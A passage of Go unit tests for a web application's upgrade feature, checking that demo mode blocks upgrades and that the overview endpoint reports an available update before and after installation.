	if r := request(h, "POST", "/api/upgrade", `{}`, headers, cookie); r.Code != 403 || !strings.Contains(r.Body.String(), "演示") {
		t.Fatalf("demo upgrade: %d %s", r.Code, r.Body.String())
	}
	if r := request(h, "GET", "/api/upgrade", "", nil, cookie); r.Code != 200 || !strings.Contains(r.Body.String(), `"current"`) {
		t.Fatalf("demo status: %d %s", r.Code, r.Body.String())
	}
}

func TestOverviewReportsAnAvailableUpdate(t *testing.T) {
	g := newUpRig(t)
	h := g.a.routes()
	field := func() any {
		var out map[string]any
		r := request(h, "GET", "/overview", "", nil, nil)
		if r.Code != 200 {
			t.Fatalf("overview: %d %s", r.Code, r.Body.String())
		}
		json.Unmarshal(r.Body.Bytes(), &out)
		return out["update_available"]
	}
	if v := field(); v != "" {
		t.Fatalf("before any check: %v", v)
	}
	g.srv.publish(t, newVer, releaseFiles(newVer, "exit 0\n"))
	g.check()
	if v := field(); v != newVer {
		t.Fatalf("after a check: %v", v)
	}
	version = newVer
	if v := field(); v != "" {
		t.Fatalf("once installed: %v", v)
	}
}
